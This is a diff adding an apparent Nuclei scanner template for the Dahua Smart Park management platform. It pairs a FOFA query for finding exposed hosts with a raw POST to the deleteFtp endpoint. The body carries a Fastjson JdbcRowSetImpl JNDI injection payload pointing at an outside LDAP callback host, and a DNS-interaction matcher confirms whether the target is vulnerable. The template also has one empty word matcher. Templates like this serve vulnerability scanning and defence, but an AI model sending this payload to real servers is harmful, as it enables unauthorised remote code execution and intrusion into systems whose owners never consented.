@@ -1,0 +1,35 @@
+id: deleteFtp
+info:
+  name: 大华智慧园区综合管理平台
+  author: mike
+  severity: info
+  description: 大华智慧园区综合管理平台
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: body="src=\"/WPMS/asset/common/js/jsencrypt.min.js\""
+http:
+  - raw:
+      - |
+        POST /CardSolution/card/accessControl/swingCardRecord/deleteFtp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Connection: close
+        Content-Length: 224
+        Content-Type: application/json
+        Accept-Encoding: gzip
+
+        {"ftpUrl":{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh-url}}","autoCommit":true}}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - 
+      - type: word
+        part: interactsh_protocol 
+        words:
+          - "dns"
